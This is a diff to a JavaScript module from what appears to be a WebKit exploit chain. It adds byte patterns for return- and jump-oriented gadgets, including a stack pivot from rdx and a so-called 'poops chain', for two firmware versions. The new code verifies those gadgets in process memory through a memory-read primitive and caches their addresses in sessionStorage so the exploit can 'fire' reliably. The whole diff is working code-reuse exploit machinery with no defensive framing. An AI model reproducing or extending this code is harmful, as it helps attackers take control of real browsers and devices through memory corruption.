@@ -123,7 +123,7 @@ export function pivotScanHint(key, found, scanMax, off) {
     return known[Math.floor(known.length / 2)];
 }
 
-/** Rows: [label, offsetKey, bytePattern] */
+/** Prefix patterns (scan hints) — execution must match PIVOT_EXEC_PATTERNS. */
 export const PIVOT_ROWS = [
     ["MOV_RDI_RAX", "wk_MOV_QWORD_PTR_RDI_RAX_RET", [0x48, 0x89, 0x07, 0xc3]],
     ["G0", "wk_MOV_RDI_RSI_30_CALL", [0x48, 0x8b, 0x7e, 0x30]],
@@ -133,6 +133,16 @@ export const PIVOT_ROWS = [
     ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, 0x38]],
     ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
 ];
+
+/** Full poops chain gadgets — partial prefix match is NOT enough to fire. */
+export const PIVOT_EXEC_PATTERNS = {
+    G0: [0x48, 0x8b, 0x7e, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x10],
+    G1: [0x58, 0x48, 0x8b, 0x07, 0xff, 0x60, 0x18],
+    G2: [0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10],
+    G3: [0x48, 0x8b, 0x78, 0x08, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x20],
+    G4: null,
+    G5: null,
+};
 
 /** G5 accepts any stack-pivot-from-rdx gadget (13.52 may differ from 13.00 push/pop) */
 export const G5_PATTERNS = [
@@ -162,6 +172,23 @@ export function pivotPattern(row, off) {
     return pat;
 }
 
+/** Full execution pattern for G0-G4 (null = use pivotPattern prefix only). */
+export function pivotExecPattern(label, off) {
+    if (label === "G4") {
+        const sp = (off && off.pivot_view_sp != null) ? (off.pivot_view_sp & 0xff) : 0x38;
+        return [0x48, 0x8b, 0x50, sp, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10];
+    }
+    const p = PIVOT_EXEC_PATTERNS[label];
+    if (p) return p;
+    return null;
+}
+
+export function pivotVerifyPattern(row, off) {
+    const exec = pivotExecPattern(row[0], off);
+    if (exec) return exec;
+    return pivotPattern(row, off);
+}
+
 export function checkPivotBytes(read1, base, rva, pat) {
     if (rva == null || !base) return false;
     const a = base.add32(rva);
@@ -182,7 +209,6 @@ export function verifyPivotSet(read1, base, off) {
         const label = row[0];
         const key = row[1];
         const rva = off[key];
-        const pat = pivotPattern(row, off);
         if (rva == null) {
             missing.push(label);
             continue;
@@ -193,8 +219,14 @@ export function verifyPivotSet(read1, base, off) {
             else bad.push(label);
             continue;
         }
-        if (checkPivotBytes(read1, base, rva, pat))
+        const pat = pivotVerifyPattern(row, off);
+        const prefix = pivotPattern(row, off);
+        const fullOk = checkPivotBytes(read1, base, rva, pat);
+        const prefixOk = pat !== prefix && checkPivotBytes(read1, base, rva, prefix);
+        if (fullOk)
             good.push(label);
+        else if (prefixOk)
+            bad.push(label + " (prefix-only — FULL gadget mismatch, fire OOMs)");
         else
             bad.push(label);
     }
@@ -206,6 +238,57 @@ export function verifyPivotSet(read1, base, off) {
         count: good.length,
         total: PIVOT_ROWS.length,
     };
+}
+
+/** Persist full-pattern RVAs that replace stale HW prefix-only hits (G0-G4). */
+export const PIVOT_FULL_KEY = "wk-pivot-full";
+export const PIVOT_FULL_BASE_KEY = "wk-pivot-full-base";
+
+export function loadPivotFullOverride() {
+    try {
+        const raw = sessionStorage.getItem(PIVOT_FULL_KEY);
+        if (!raw) return null;
+        return JSON.parse(raw);
+    } catch (_) {
+        return null;
+    }
+}
+
+export function savePivotFullOverride(base, found) {
+    if (!found || typeof found !== "object") return;
+    try {
+        const prev = loadPivotFullOverride() || {};
+        const merged = Object.assign({}, prev);
+        for (const key of Object.keys(found)) {
+            if (found[key] != null && PIVOT_KEYS.indexOf(key) >= 0)
+                merged[key] = found[key];
+        }
+        sessionStorage.setItem(PIVOT_FULL_KEY, JSON.stringify(merged));
+        if (base) sessionStorage.setItem(PIVOT_FULL_BASE_KEY, String(base));
+    } catch (_) { }
+}
+
+export function clearPivotFullOverride() {
+    try {
+        sessionStorage.removeItem(PIVOT_FULL_KEY);
+        sessionStorage.removeItem(PIVOT_FULL_BASE_KEY);
+    } catch (_) { }
+}
+
+/** Apply session full-pattern overrides (saved after scan on prefix-only HW miss). */
+export function mergePivotFullOff(off, webkitBase) {
+    const full = loadPivotFullOverride();
+    if (!full) return off;
+    try {
+        const savedBase = sessionStorage.getItem(PIVOT_FULL_BASE_KEY);
+        if (savedBase && webkitBase && String(webkitBase) !== savedBase) return off;
+    } catch (_) { }
+    const out = Object.assign({}, off);
+    for (const key of Object.keys(full)) {
+        if (full[key] != null && PIVOT_KEYS.indexOf(key) >= 0)
+            out[key] = full[key];
+    }
+    return out;
 }
 
 export function mergeScannedPivot(off, scanned) {
